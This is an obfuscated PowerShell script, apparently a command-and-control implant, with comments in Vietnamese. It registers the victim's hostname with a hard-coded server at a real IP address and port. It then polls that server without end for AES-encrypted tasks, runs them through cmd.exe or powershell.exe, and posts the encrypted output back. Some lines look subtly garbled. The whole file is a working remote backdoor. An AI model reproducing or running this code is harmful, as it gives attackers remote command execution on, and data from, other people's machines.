`${8rT3WA} = [Type] System.Security.Cryptography.CipherMode::SV72j5O ([Type](System.Security.Cryptography.PaddingMode));
   ${XNfD} = [Type](System.Convert);
${HLvW1} = [Type] System.Text.Encoding::Set-Item Variable:92y7([Type] System.Net.Dns);
${UJXRc} = [type] String;

function Create-AesManagedObject(${Key}, ${5TMRWpLUy}) {
    $aes = New-Object System.Security.Cryptography.AesManaged;
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC;
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros;
    #kich thuoc khoi ma hoa
    $aes.BlockSize = 128;
    #kich thuoc khoa ma hoa
    $aes.KeySize = 256;
    # if tham so truyen vao khong rong thi
    if (${5TMRWPluy}) {
        # neu la type chuoi thi 
        if (${5TmRWpLuy}.getType."Invoke"()."Name" -eq String) {
            #base64 tham so = iv
            $aes."Iv" = (&dir Variable:xNFd)."Value"::FromBase64String."Invoke"(${5TMRWPlUy})
        } else {
        # neu khong la chuoi thi lay ching no
            $aes."IV" = ${5tmRwPLUy}
        }
    }
    if (${Key}) {
        #neu la string thi decode base64 va lay lam key, khong thi key = {Key}
        if (${Key}.getType."Invoke"()."Name" -eq String) {
            $aes."Key" = (&('LS')(Variable:XNFD))."Value"::FromBase64String."Invoke"(${Key})
        } else {
            $aes."key" = ${Key}
        }
    }
    $aes
}
# hàm encrypt plaintext bằng AES CBC mode
#Trả về là chuỗi ciphertext encode base64
function Encrypt(${Key}, ${plaintext}) {
    #chuyển pl thành bytes
    ${ByTES} = (.Variable hlvW1)."VALUE"::"Utf8".GetBytes."Invoke"(${plaintext})
    $aes = Create-AesManagedObject ${Key}
    ${qDIqLGaQ99} = $aes.CreateEncryptor."Invoke"()
    ${lwihYmIF99} = ${QdiqLgaq99}.TransformFinalBlock."Invoke"(${byTeS}, 0, ${byTes}."Length");                 
    [byte[]] ${fJAxUWQN99} = $aes."Iv" + ${lWiHYmiF99}
    $aes.Dispose."Invoke"()
    ${xNFd}::"ToBase64String"."Invoke"(${FjAXUWqN99})
}

function Decrypt(${Key}, ${ciphertext}) {
    # decode base64 ciphertext
    ${bYTEs} = (&Variable 'xnfd')."Value"::FromBase64String."Invoke"(${ciphertext})
    # lấy 16 bytes đầu tiên
    ${5tMRWpLuY} = ${BYTes}[0..15]
    $aes = Create-AesManagedObject ${Key} ${5TMRwpLUY}
    ${MNDmWYnB99} = $aes.CreateDecryptor."Invoke"();
    ${AhtLMYhl99} = ${MNDmWynB99}.TransformFinalBlock."Invoke"(${bYTES}, 16, ${byTeS}."Length" - 16);
    $aes.Dispose."Invoke"()
    ${HLVW1}::"UTF8"."GetString"(${AhtLmYhl99})."Trim"([char]0)
}

function Shell(${DfJz1co}, ${yo8xm5}) {
    ${CwzVYVJ} = &New-Object System.Diagnostics.ProcessStartInfo
    ${CwZVyVj}."FileName" = ${DFjZ1co}
    ${CWzvYvj}."RedirectStandardError" = ${TRue}
    ${cwZVYVJ}."RedirectStandardOutput" = ${tRUe}
    ${CWZvyVJ}."UseShellExecute" = ${FALsE}
    ${cwzvyVJ}."Arguments" = ${yO8xm5}
    ${p} = .New-Object System.Diagnostics.Process
    ${P}."StartInfo" = ${CWzvYVj}

    ${p}.Start."Invoke"() | &Out-Null
    ${P}.WaitForExit."Invoke"()

    ${BHnxNUrW99} = ${p}."StandardOutput".ReadToEnd."Invoke"()
    ${NmWkjOAB99} = ${p}."StandardError".ReadToEnd."Invoke"()
    ${kCNjcQdL} = ('VALID ' + "$BhnXnUrW99n$nmWKJOAb99")
    ${KcnJcQDl}
}

${IP} = 128.199.207.220
${PORT} = 1337
${Key} = d/3KwjM7m2cGAtLI67KlhDuXI/XRKSTkOlmJXE42R+M=
${n} = 3
${data} = ""
${hostname} = ${92Y7}::GetHostName."Invoke"() 
${type} = "p"
${URL} = ("http" + ':' + "//$IP" + ':' + "$PORT/reg") # http://128.199.207.220:1337/reg
${body} = @{
    name = "$hostname"
    type = "$type"
}
${data} = (&Invoke-WebRequest UseBasicParsing -Uri ${URL} -Body ${body} -Method POST)."Content"
${results} = ("http" + ':' + "//$IP" + ':' + "$PORT/results/$data")
${tasks} = ("http" + ':' + "//$IP" + ':' + "$PORT/tasks/$data")

for (;;) {
    ${content} = (.Invoke-WebRequest -UseBasicParsing -Uri ${tasks} -Method 'GET')."Content"

    if (-Not ${UJXRc}::IsNullOrEmpty."Invoke"(${content})) {
        ${content} = .Decrypt ${Key} ${content}
        ${content} = ${content}.split."Invoke"()
        ${FLAG} = ${content}[0]

        if (${FlAg} -eq 'VALID') {
            ${WB1SWYoje} = ${content}[1]
            ${yO8XM5S} = ${content}[2..${content}."Length"]
            if (${wb1sWyoJe} -eq shell) {
                ${F} = cmd.exe
                ${yO8XM5} = "/c "

                foreach (${a} in ${yo8xM5s}) { ${Yo8xm5} += ${a} + " " }
                ${KcNJCQdL} = .Shell ${f} ${yo8xM5}
                ${kCnjCQDL} = .Encrypt ${Key} ${kcNjcqdl}
                ${body} = @{ result = "$KcnJCQDl" }
                &Invoke-WebRequest -UseBasicParsing -Uri ${results} -Body ${body} -Method POST
            } elseif (${Wb1SwYOJe} -eq 'powershell') {
                ${f} = powershell.exe
                ${yO8Xm5} = "/c "

                foreach (${a} in ${Yo8xM5s}) { ${YO8xm5} += ${a} + " " }
                ${kcNjcqdL} = &Shell ${F} ${yO8XM5}
                ${kcnjCQDL} = .Encrypt ${Key} ${KCNjcqDl}
                ${body} = @{ result = "$KcnJCQDl" }

                &Invoke-WebRequest -UseBasicParsing -Uri ${results} -Body ${body} -Method POST
            } elseif (${wb1swYOJe} -eq sleep) {
                ${n} = [int]${yO8Xm5S}[0]
                ${body} = @{ result = "" }
                &Invoke-WebRequest -UseBasicParsing -Uri ${results} -Body ${body} -Method POST
            } elseif (${wb1sWyojE} -eq 'rename') {
                ${data} = ${YO8Xm5S}[0]
                ${results} = ('http' + ':' + "//$IP" + ':' + "$PORT/results/$data")
                ${tasks} = ('http' + ':' + "//$IP" + ':' + "$PORT/tasks/$data")

                ${body} = @{ result = "" }
                .Invoke-WebRequest -UseBasicParsing -Uri ${results} -Body ${body} -Method POST
            } elseif (${wB1sWYOJe} -eq quit) {
                exit
            }
        }
        .sleep ${N}
    }
}
